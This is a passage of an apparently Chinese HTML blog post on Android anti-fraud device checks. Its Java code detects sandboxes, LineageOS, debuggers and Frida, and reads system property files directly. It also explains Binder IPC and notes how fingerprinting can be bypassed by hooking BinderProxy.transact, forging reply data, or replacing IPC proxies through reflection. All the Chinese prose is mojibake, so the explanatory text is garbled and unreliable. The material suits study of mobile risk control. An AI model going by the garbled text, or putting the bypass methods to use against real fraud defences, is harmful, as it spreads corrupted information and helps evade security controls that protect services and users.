if(!name.equals(MainActivity.class.getName())&amp;&amp;</span><br><span class="line">                    !name.equals(ShareActivity.class.getName())&amp;&amp;</span><br><span class="line">                        !name.equals(FeedbackActivity.class.getName())</span><br><span class="line">                )&#123;</span><br><span class="line">                list.add(activty);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //åˆ¤æ–­listæ•°é‡æ˜¯å¦å¤§äº1</span><br><span class="line">        if (list.size() &gt;= 1) &#123;</span><br><span class="line">            ListItemBean item = new ListItemBean(</span><br><span class="line">                    &quot;æ£€æµ‹åˆ°APKå­˜åœ¨æ²™ç®±å†…éƒ¨&quot;,</span><br><span class="line">                    ListItemBean.RiskLeave.Deadly);</span><br><span class="line">            for (Object obj : list) &#123;</span><br><span class="line">                item.putData(obj.getClass().getName());</span><br><span class="line">            &#125;</span><br><span class="line">            return item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ£€æµ‹Google-lineageos"><a href="#æ£€æµ‹Google-lineageos" class="headerlink" title="æ£€æµ‹Google&amp;lineageos"></a>æ£€æµ‹Google&amp;lineageos</h3><p>å› ä¸ºåœ¨å›½å†…æ‰‹æœºé‡ŒåŸºæœ¬<code>Google</code>å’Œ<code>lineageos</code>éƒ½æ˜¯é»‘äº§çš„æ ‡é… ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯è‡ªå·±åˆ·çš„ROM</p><p>è¿™ç§æ‰‹æœºç†è®ºä¸Šåœ¨å›½å†… ä¸åº”è¯¥å‡ºç°ï¼Œå¦‚æœå‡ºç°ä¹Ÿä¼šè¢«æ‰“ä¸Šæ ‡ç­¾ï¼Œè¢«è®¤å®šä¸ºé»‘äº§ ã€‚å¯ä»¥ç›´æ¥Build.MODEL è·å–å‚å•†</p><p>å¦å¤–è¿™å—è¿˜æœ‰ä¸€ä¸ªç»†èŠ‚ç‚¹ ï¼Œå°±æ˜¯<code>lineageos</code>ä¸€ä¸ªç‰¹æœ‰æ–‡ä»¶<code>/system/addon.d</code> ã€‚å…·ä½“å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">private static void isLineageOs(ArrayList&lt;ListItemBean&gt; items) &#123;</span><br><span class="line">    //lineageæ£€æµ‹</span><br><span class="line">    String display = NativeEngine.getZhenxiInfoH(&quot;ro.build.display.id&quot;);</span><br><span class="line">    if (display.toLowerCase(Locale.ROOT).contains(&quot;lineage&quot;)) &#123;</span><br><span class="line">        items.add(</span><br><span class="line">                new ListItemBean(&quot;å½“å‰æ‰‹æœºä¸ºLineageç³»ç»Ÿ&quot;,</span><br><span class="line">                        ListItemBean.RiskLeave.Warn,</span><br><span class="line">                        &quot;å¯èƒ½å­˜åœ¨è‡ªå®šä¹‰ROM,å½“å‰è®¾å¤‡ä¸å¯ä¿¡ï¼&quot;</span><br><span class="line">                ));</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    //lineage ç‰¹æœ‰æ–‡ä»¶</span><br><span class="line">    File file = new File(&quot;/system/addon.d&quot;);</span><br><span class="line">    if (file.exists()) &#123;</span><br><span class="line">        items.add(</span><br><span class="line">                new ListItemBean(&quot;å½“å‰æ‰‹æœºä¸ºLineageç³»ç»Ÿ&quot;,</span><br><span class="line">                        ListItemBean.RiskLeave.Warn,</span><br><span class="line">                        &quot;å¯èƒ½å­˜åœ¨è‡ªå®šä¹‰ROM,å½“å‰è®¾å¤‡ä¸å¯ä¿¡ï¼&quot;</span><br><span class="line">                ));</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶è¿™å—æœ‰ä¸€ä¸ªç»†èŠ‚ç‚¹ï¼š</p><p>ç›´æ¥è·å– <code>ro.build.display.id</code> å¯èƒ½ä¼šè¢«<code>Hook</code> ï¼Œæ‰€ä»¥è¿™å—æˆ‘çš„å»ºè®®æ˜¯ç›´æ¥å»è§£æé…ç½®æ–‡ä»¶</p><p>æ ¸å¿ƒè§£æï¼ˆ&#x2F;dev&#x2F;<strong>properties</strong>&#x2F;u:object_r: ï¼‰æ–‡ä»¶æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">    public PropArea(String area) throws IOException &#123;</span><br><span class="line">        area = &quot;/dev/__properties__/u:object_r:&quot; + area + &quot;:s0&quot;;</span><br><span class="line">        File file = new File(area);</span><br><span class="line">        if (!file.isFile()) throw new FileNotFoundException(&quot;Not a file: &quot; + area);</span><br><span class="line">        long size = file.length();</span><br><span class="line">        if (size &lt;= 0 || size &gt;= 0x7fffffffL) throw new IllegalArgumentException(&quot;invalid file size &quot; + size);</span><br><span class="line"> </span><br><span class="line">        try (FileChannel channel = new FileInputStream(area).getChannel()) &#123;</span><br><span class="line">            data = channel.map(FileChannel.MapMode.READ_ONLY, 0, size).order(ByteOrder.nativeOrder());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        byteUsed = data.getInt();</span><br><span class="line">        data.getInt(); // serial</span><br><span class="line">        int magic = data.getInt();</span><br><span class="line">        if (magic != PROP_AREA_MAGIC) throw new IllegalArgumentException(&quot;Bad file magic: &quot; + magic);</span><br><span class="line">        int version = data.getInt();</span><br><span class="line">        if (version != PROP_AREA_VERSION) throw new IllegalArgumentException(&quot;Bad area versin: &quot; + version);</span><br><span class="line">        data.position(data.position() + 28); // reserved</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">public List&lt;String&gt; findPossibleValues(String name) &#123;</span><br><span class="line">    List&lt;String&gt; values ;</span><br><span class="line">    try &#123;</span><br><span class="line">        //  atomic_uint_least32_t serial;</span><br><span class="line">        //  union &#123;</span><br><span class="line">        //    char value[PROP_VALUE_MAX];</span><br><span class="line">        //    struct &#123;</span><br><span class="line">        //      char error_message[kLongLegacyErrorBufferSize];</span><br><span class="line">        //      uint32_t offset;</span><br><span class="line">        //    &#125; long_property;</span><br><span class="line">        //  &#125;;</span><br><span class="line">        final int LONG_PROP_FLAG = 1 &lt;&lt; 16;</span><br><span class="line">        final int PROP_VALUE_MAX = 92;</span><br><span class="line">        final int VALUE_OFFSET = 4;</span><br><span class="line">        final int NAME_OFFSET = VALUE_OFFSET + 92;</span><br><span class="line">        values = new ArrayList&lt;&gt;(2);</span><br><span class="line">        findFromBuffer(data.slice(), name.getBytes(StandardCharsets.UTF_8), (buffer, offset) -&gt; &#123;</span><br><span class="line">            if (offset &lt; NAME_OFFSET) return;</span><br><span class="line">            int base = offset - NAME_OFFSET;</span><br><span class="line">            int serial = buffer.getInt(base);</span><br><span class="line">            if ((serial &amp; LONG_PROP_FLAG) != 0) return; // Long properties are not supported</span><br><span class="line">            values.add(toString(buffer, base + VALUE_OFFSET, PROP_VALUE_MAX));</span><br><span class="line">        &#125;);</span><br><span class="line">        CLog.i(&quot;Found &quot; + name + &quot;=&quot; + values);</span><br><span class="line">        return values;</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        CLog.e(&quot;findPossibleValues get error &quot;+ name+&quot; &quot;+e);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ£€æµ‹IDAå’Œåè°ƒè¯•ï¼š"><a href="#æ£€æµ‹IDAå’Œåè°ƒè¯•ï¼š" class="headerlink" title="æ£€æµ‹IDAå’Œåè°ƒè¯•ï¼š"></a>æ£€æµ‹IDAå’Œåè°ƒè¯•ï¼š</h3><p>è¿™å—æ£€æµ‹æ–¹æ³•å¤ªå¤šäº†ï¼Œæ¯”å¦‚æ ¸å¿ƒAå’ŒBæ–¹æ³•é‡Œé¢åŠ ä¸ªæ—¶é—´æˆ³ï¼Œå¦‚æœAæ‰§è¡Œåˆ°Bå¤§äº5ç§’å°±å¯ä»¥è®¤ä¸ºè¢«è°ƒè¯• ã€‚</p><p>æ£€æµ‹è°ƒè¯•çŠ¶æ€ä¹Ÿæ˜¯å¾ˆä¸é”™çš„é€‰æ‹©ï¼Œä¸è¿‡è¿™å—å¯ä»¥åˆ©ç”¨<code>ISO</code>çº¿ç¨‹å»æ£€æµ‹è°ƒè¯•çŠ¶æ€ï¼Œé˜²æ­¢è¢«<code>ptrace</code></p><h4 id="service-list"><a href="#service-list" class="headerlink" title="service list"></a>service list</h4><p>ä¹Ÿå¯ä»¥æ‰§è¡Œ â€œ<code>service list</code>â€œ è·å–æœåŠ¡åˆ—è¡¨ ï¼Œåˆ¤æ–­æ˜¯å¦åŒ…å«fridaå…³é”®å­— ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">public static CheckServerRet checkServer(Context context, String[] fit) &#123;</span><br><span class="line">    CheckServerRet ret = new CheckServerRet();</span><br><span class="line">    ArrayList&lt;String&gt; list = ret.list;</span><br><span class="line">    BufferedReader reader = null;</span><br><span class="line">    Process process;</span><br><span class="line">    try &#123;</span><br><span class="line">        // æ‰§è¡Œ service list å‘½ä»¤</span><br><span class="line">        process = Runtime.getRuntime().exec(&quot;service list&quot;);</span><br><span class="line"> </span><br><span class="line">        // è¯»å–å‘½ä»¤è¾“å‡ºç»“æœ</span><br><span class="line">        reader = new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        while ((line = reader.readLine()) != null) &#123;</span><br><span class="line">            if (line.length() &gt; 1) &#123;</span><br><span class="line">                for (String fitItem : fit) &#123;</span><br><span class="line">                    //æ¯”è¾ƒä¸åŒºåˆ†å¤§å°å†™</span><br><span class="line">                    if (line.toLowerCase().contains(fitItem.toLowerCase())) &#123;</span><br><span class="line">                        list.add(line);</span><br><span class="line">                        //CLog.e(&quot;checkServer find item is match &quot; + Arrays.toString(fit) + &quot; &quot; + line);</span><br><span class="line">                        break;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        //èµ°åˆ°è¿™é‡Œè¯´æ˜èƒ½æ‹¿åˆ°ã€‚è¿”å›çš„ä¸æ˜¯ç©º</span><br><span class="line">                        ret.isSuccess = true;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        // å…³é—­æµ</span><br><span class="line">        reader.close();</span><br><span class="line"> </span><br><span class="line">        // ç­‰å¾…å‘½ä»¤æ‰§è¡Œå®Œæ¯•</span><br><span class="line">        int exitValue = process.waitFor();</span><br><span class="line">        CLog.e(&quot;checkServer ret mark &quot; + Arrays.toString(fit) + &quot; &quot; + ret);</span><br><span class="line">        return ret;</span><br><span class="line">    &#125; catch (IOException | InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        if (reader != null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                reader.close();</span><br><span class="line">            &#125; catch (IOException ignored) &#123;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è®¾å¤‡æŒ‡çº¹3"><a href="#è®¾å¤‡æŒ‡çº¹3" class="headerlink" title="è®¾å¤‡æŒ‡çº¹3"></a>è®¾å¤‡æŒ‡çº¹3</h2><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><h4 id="IPCä»£ç†-IPCåè®®æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#IPCä»£ç†-IPCåè®®æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="IPCä»£ç†&amp;IPCåè®®æ˜¯ä»€ä¹ˆï¼Ÿ"></a>IPCä»£ç†&amp;IPCåè®®æ˜¯ä»€ä¹ˆï¼Ÿ</h4><p>Androidæ˜¯åŸºç¡€çš„CSæ¶æ„ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ¶æ„ ã€‚å®‰å“ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆè®¾è®¡å‘¢ï¼Ÿå¦‚æœæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯åœ¨ä¸€ä¸ªè¿›ç¨‹å†…ï¼Œå®¢æˆ·ç«¯å´©æºƒäº†ï¼ŒæœåŠ¡ç«¯ä¹Ÿä¼šä¸€èµ·å´©æºƒï¼Œå¯¼è‡´æ•´ä¸ªç³»ç»Ÿä¸ç¨³å®š </p><p>å®‰å“å’ŒJavaç›¸æ¯”å¤šä¸ªä¸€ä¸ªContextï¼Œè¿™ä¸ªContextæ˜¯è°ƒç”¨å®‰å“æœ¬èº«æä¾›apiçš„æ¡¥æ¢ ï¼Œé‡Œé¢æœ‰å„ç§å®‰å“ç³»ç»Ÿæä¾›çš„å„ç§åŸºç¡€API</p><p>è¿™äº›APIå¯ä»¥ç›´æ¥æ“ä½œAndroidç³»ç»Ÿ ï¼Œå®‰å“æœ¬èº«é€šè¿‡å„ç§å„æ ·çš„Managerå»æä¾›å¯¹åº”çš„Apiå»è·å–å’Œä¿®æ”¹ ã€‚æ¯”å¦‚<code>PackageManagerï¼ŒActivityManager</code>ç­‰ï¼Œè¿™äº›Manageré‡Œé¢éƒ½ä¼šæŒæœ‰ä¸€ä¸ªä»£ç†äºº ã€‚å½“æˆ‘ä»¬å»è°ƒç”¨è¿™ä¸ªManageré‡Œé¢çš„ä¸€äº›Apiçš„æ—¶å€™ï¼Œä¸€äº›ç®€å•çš„Apiä»–ä¼šå°è¯•å»è‡ªå·±åœ¨æœ¬è¿›ç¨‹Nativeæˆ–è€…Javaå»å®ç°ï¼Œå¦‚æœä¸€äº›å¤æ‚çš„å­—æ®µï¼Œæ¯”å¦‚æŸ¥è¯¢ç³»ç»Ÿçš„ä¸€äº›ä¿¡æ¯ï¼Œæˆ–è€…è°ƒç”¨ä¸€äº›ç³»ç»Ÿå…³é”®å‡½æ•°ï¼Œè¿™ç§æ—¶å€™ä»–ä¼šå»è°ƒç”¨â€œIPCä»£ç†äºº â€ï¼Œè¿™ä¸ªIPCä»£ç†äººå°±æ˜¯åƒæœåŠ¡ç«¯é€šè®¯çš„å…³é”® ã€‚ä»–ç›¸å½“äºæ˜¯å‘æœåŠ¡ç«¯çš„ä¼ è¯å¾—äºº ï¼Œä»£ç†è®¾è®¡æ¨¡å¼ ã€‚å¯¹ä¸åŒçš„Manageræä¾›ä¸ä¸€æ ·çš„åŠŸèƒ½ ï¼Œè€Œä»–ä¼ çš„è¯å°±æ˜¯å¯¹åº”çš„IPCåè®® ã€‚è¿™ä¸ªåè®®å¦‚ä½•ä¼ é€’çš„ï¼Œå°±æ˜¯é€šè¿‡åº•å±‚çš„å…±äº«å†…å­˜<code>Binder</code>å»å®ç°çš„ ã€‚</p><p>è€Œè¿™ä¸ªåè®®é‡Œé¢å…·ä½“å‘é€çš„å†…å®¹ï¼Œå°±æ˜¯IPCåè®®è£…çš„â€œåŒ…è£¹â€å°±æ˜¯ç”¨çš„<code>Parcel</code> ã€‚</p><p>è¿™å—ä¸¾ä¸ªæ —å­ï¼Œå½“ç”¨æˆ·è°ƒç”¨ä¸€ä¸ªæœªåˆå§‹åŒ–çš„<code>API</code>æ—¶å€™ï¼Œéœ€è¦è·¨è¿›ç¨‹é€šè®¯ï¼Œåˆ°åº•å‘ç”Ÿäº†å“ªäº›åŠ¨ä½œ</p><p><strong>ç”¨æˆ·è°ƒç”¨ç³»ç»ŸAPI-&gt;Manageræ”¶åˆ°è°ƒç”¨æ¶ˆæ¯-&gt;åˆ¤æ–­æ˜¯å¦éœ€è¦è°ƒç”¨æœåŠ¡ç«¯-&gt;è°ƒç”¨IPCä»£ç†é‡Œé¢çš„æ–¹æ³•-&gt;IPCä»£ç†æ„å»ºå‘é€çš„æ•°æ®åŒ…è°ƒç”¨Binderè¿›è¡Œé€šè®¯æ•°æ®å†™å…¥ä»¥åè¿”å›</strong></p><p>è¿™ä¸ªIPCä»£ç†å®ç°äº†Binderçš„æ¥å£ï¼Œå½“å‰è¿›ç¨‹è°ƒç”¨çš„æœ€åä¸€ä¸ªAPIå°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;android.os.BinderProxy&quot;-&gt;transact</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæ–¹æ³•åº•å±‚è°ƒç”¨çš„æ˜¯Binderçš„é©±åŠ¨ï¼Œæœ€ç»ˆä¼šå»nativeå±‚å†™å…¥ï¼Œå‰©ä¸‹çš„å°±æ˜¯å¼€å§‹è¿è¡ŒæœåŠ¡ç«¯çš„é€»è¾‘äº†ã€‚æŠŠæ•°æ®å†™å…¥åˆ°transactæ–¹æ³•çš„å‚æ•°3é‡Œé¢ã€‚ç„¶åç¨‹åºè¿”å›ï¼Œä¸‹é¢æ˜¯è¿™ä¸ªæ–¹æ³•çš„åŸå‹</p><blockquote><p>ä¹‹å‰é€šè¿‡hook binderæ¥bypassæŒ‡çº¹ï¼Œæœ‰ä¸€ä¸ªæ–¹æ³•å°±æ˜¯é€šè¿‡hookè¿™ä¸ª<code>transact</code>æ–¹æ³•</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * Perform a binder transaction on a proxy.</span><br><span class="line">     *</span><br><span class="line">     * @param code The action to perform.  This should</span><br><span class="line">     * be a number between &#123;@link #FIRST_CALL_TRANSACTION&#125; and</span><br><span class="line">     * &#123;@link #LAST_CALL_TRANSACTION&#125;.</span><br><span class="line">     * @param data Marshalled data to send to the target.  Must not be null.</span><br><span class="line">     * If you are not sending any data, you must create an empty Parcel</span><br><span class="line">     * that is given here.</span><br><span class="line">     * @param reply Marshalled data to be received from the target.  May be</span><br><span class="line">     * null if you are not interested in the return value.</span><br><span class="line">     * @param flags Additional operation flags.  Either 0 for a normal</span><br><span class="line">     * RPC, or &#123;@link #FLAG_ONEWAY&#125; for a one-way RPC.</span><br><span class="line">     *</span><br><span class="line">     * @return</span><br><span class="line">     * @throws RemoteException</span><br><span class="line">     */</span><br><span class="line">    public boolean transact(int code, Parcel data, Parcel reply, int flags) throws RemoteException &#123;</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯codeï¼Œè¿™ä¸ªcodeæŒ‡çš„æ˜¯å…·ä½“çš„<strong>äº‹ä»¶ç±»å‹</strong>ï¼Œä¸åŒçš„äº‹ä»¶ä¼ å…¥çš„æ•°å­—ä¹Ÿä¸ä¸€æ ·</p><p>ç¬¬äºŒå‚æ•°æ˜¯<strong>å‘é€çš„æ•°æ®åŒ…</strong>ï¼Œè¿™æ—¶å€™IPCå·²ç»å¾€é‡Œé¢è¿›è¡Œäº†å†™å…¥å¯¹åº”çš„æ•°æ®åŒ… </p><p>ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯replyï¼Œä¹Ÿå°±æ˜¯<strong>æœåŠ¡ç«¯è¿”å›çš„ä¿å­˜å†…å®¹</strong></p><p>æ³¨æ„ï¼š</p><blockquote><p><strong>è¿™å—å¯èƒ½å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œæœ‰çš„æ•°æ®ï¼Œè¿™ä¸ªæ—¶å€™ä½ åœ¨afterå»è¦†å†™è¿™ä¸ªå‚æ•°3å·²ç»“æ™šäº†ï¼Œå› ä¸ºæ•°æ®åœ¨åˆ«çš„è¿›ç¨‹å·²ç»“å†™å…¥äº† ã€‚</strong> <strong>å¦‚æœä½ æƒ³å¯¹è¿™ä¸ªå‚æ•°è¿›è¡Œä¿®æ”¹ï¼Œæœ€å¥½çš„åŠæ³•æ˜¯ç›´æ¥æ¨¡æ‹ŸæœåŠ¡ç«¯æ‰‹åŠ¨å¾€replyè¿›è¡Œå†™å…¥</strong></p></blockquote><p>ç¬¬å››ä¸ªå‚æ•°æ˜¯flagsï¼Œä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚ä½ æƒ³è·å–æ­£å¸¸çš„<code>PackageInfo</code>ï¼Œä¸éœ€è¦è·å–ç­¾åä¹‹ç±»çš„ä¿¡æ¯ï¼Œä½ ä¼ å…¥0å³å¯ </p><p>å¦‚æœæƒ³è·å–ç­¾åå°±éœ€è¦ä¼ å…¥<code>PackageManager.GET_SIGNATURES</code>ï¼Œè¿™ä¸ªflagç›¸å½“äºå‘Šè¯‰æœåŠ¡ç«¯ï¼Œéƒ½éœ€è¦å“ªäº›åŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getPackageManager().getPackageInfo(&quot;aaa&quot;,0);</span><br><span class="line">getPackageManager().getPackageInfo(&quot;aaa&quot;,PackageManager.GET_SIGNATURES);</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ç¬¬ä¸€ä¸ªApiè·å–åˆ°çš„<code>PackageInfo</code>é‡Œé¢æ˜¯ä¸åŒ…å«ç­¾åä¿¡æ¯çš„ï¼Œç¬¬äºŒä¸ªåˆ™åŒ…å« ã€‚å½“ä½ éœ€è¦ä»€ä¹ˆåŠŸèƒ½çš„æ—¶å€™ä½¿ç”¨ â€œæˆ–â€ è¿æ¥å³å¯ã€‚</p><blockquote><p>è¿™å—æˆ‘ä»¬å¾—åˆ°ä¸€ä¸ªç»“è®ºï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯Javaå±‚é€šè®¯æœ€åä¸€ä¸ªæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯å½“å‰è¿›ç¨‹èƒ½æ“ä½œçš„æœ€åä¸€ä¸ªæ–¹æ³•ï¼Œå‰©ä¸‹çš„å°±æ˜¯æœåŠ¡ç«¯è¿›ç¨‹çš„äº‹æƒ…äº†ã€‚è¿™ä¸ªæ–¹æ³•æ˜¯Javaå±‚çš„ <strong>â€œè¾¹ç•Œå€¼ â€</strong>ï¼Œè¿™ä¸ªè¾¹ç•Œå€¼è®°ä½åé¢åœ¨æ€»ç»“é‡Œé¢ä¼šä»‹ç»åˆ°ä¸åŒçš„è¾¹ç•Œå€¼å’Œé£æ§çš„å…³ç³»ã€‚</p></blockquote><blockquote><p>è¿™å—è¿˜æœ‰çš„å¤§å‚æ›´æ¶å¿ƒï¼Œä»–ä¸èµ°transactæ–¹æ³•ï¼Œå› ä¸ºtransactæ–¹æ³•åº•å±‚èµ°çš„å°±æ˜¯Binderï¼Œ<strong>å¯ä»¥ç›´æ¥åœ¨Nativeå±‚è°ƒç”¨çš„Binder é©±åŠ¨ï¼Œå®ç°äº†transact è¿™ä¸ªæ–¹æ³•</strong> ã€‚ç„¶åè¿›è¡ŒIPCé€šè®¯ï¼Œç›´æ¥ä¸èµ°Javaå±‚ ã€‚</p><p>å½“ç„¶ä»–è¿™ç§æ–¹æ³•ä¹Ÿæ˜¯å¾ˆä¸ç¨³å®šï¼Œéœ€è¦å¯¹æ¯ä¸ªandroid ç‰ˆæœ¬éƒ½è¿›è¡Œå…¼å®¹ï¼Œå±äºä¼¤æ•Œ1000è‡ªæŸ800ç±»å‹ ï¼Œé€‚é…éš¾åº¦ä¹Ÿå¾ˆå¤§ã€‚</p><p>éšç€å®‰å“ä¸æ–­å¢å¼ºå®‰å…¨æ€§ï¼Œåé¢è¿™ç§æ–¹å¼è‚¯å®šä¼šæ…¢æ…¢è¢«PASSæ‰ ï¼Œç°åœ¨åˆ©ç”¨è·¨è¿›ç¨‹åœ¨ä½ç‰ˆæœ¬è¶ŠæƒAppçš„å¤ªå¤šäº† ã€‚</p></blockquote><h4 id="åŠ¨æ€ä»£ç†IPC"><a href="#åŠ¨æ€ä»£ç†IPC" class="headerlink" title="åŠ¨æ€ä»£ç†IPC"></a>åŠ¨æ€ä»£ç†IPC</h4><p>å°±æ˜¯æˆ‘ä¸ç”¨hookå¯ä»¥å®ç°IPCçš„ä»£ç†äººæ›¿æ¢ä¹ˆï¼Ÿ</p><blockquote><p>è¿™å—æœ‰ä¸€ä¸ªåŠ¨æ€ä»£ç†çš„çŸ¥è¯†ç‚¹ï¼Œå°±æ˜¯ä»–ä»£ç†äººæœ¬èº«æ˜¯å®ç°äº†ä¸€ä¸ªæ¥å£ï¼Œ<strong>æˆ‘ä»¬å¯ä»¥ç›´æ¥åå°„æŠŠä»–è¿™ä¸ªä»£ç†äººç»™æ›¿æ¢æˆæˆ‘ä»¬çš„</strong>ï¼Œç„¶åæˆ‘ä»¬ä½¿ç”¨<code>Proxy.newProxyInstance</code>åŠ¨æ€ä»£ç†è¿™ä¸ªæ¥å£ç±»ï¼Œä¹Ÿå¯ä»¥å®ç°ä¸éœ€è¦Hookæ¡†æ¶çš„æƒ…å†µä¸‹å®ç°åŠ¨æ€ä»£ç† ã€‚æ¯”å¦‚ä¸€äº›VAä¹‹ç±»çš„ç”¨çš„å°±æ˜¯è¿™ç§ï¼Œå› ä¸ºHookå…¶å®ç¨³å®šæ€§å•¥çš„æ²¡æœ‰åŠ¨æ€ä»£ç†çš„ç¨³å®šæ€§å¥½ï¼ŒHookçš„è¯éœ€è¦å¯¹ä¸åŒç‰ˆæœ¬å…¼å®¹ï¼Œä¸€æ—¦ç‰ˆæœ¬å‘ç”Ÿå˜åŒ–éœ€è¦é€‚é…å¾ˆå¤šä¸œè¥¿ï¼Œè€ŒåŠ¨æ€ä»£ç†åˆ™ä¸éœ€è¦ã€‚</p><p>Hookçš„è¯ç—•è¿¹å¯èƒ½æ›´å°‘ä¸€ç‚¹ï¼Œ<strong>åŠ¨æ€ä»£ç†æ£€æµ‹çš„è¯åªéœ€è¦åå°„è¿™ä¸ªIPCä»£ç†äººï¼Œç„¶ågetClass().getName() é‡Œé¢ç›´æ¥å°±æœ‰proxyä¹‹ç±»çš„å…³é”®å­—</strong> ï¼Œå„æœ‰å„çš„å¥½å¤„</p></blockquote><h3 id="è®¾å¤‡æŒ‡çº¹-2"><a href="#è®¾å¤‡æŒ‡çº¹-2" class="headerlink" title="è®¾å¤‡æŒ‡çº¹"></a>è®¾å¤‡æŒ‡çº¹</h3><h4 id="IPCAndroid-Id"><a href="#IPCAndroid-Id" class="headerlink" title="IPCAndroid_Id"></a>IPCAndroid_Id</h4><h5 id="æ–¹æ³•5ï¼š"><a 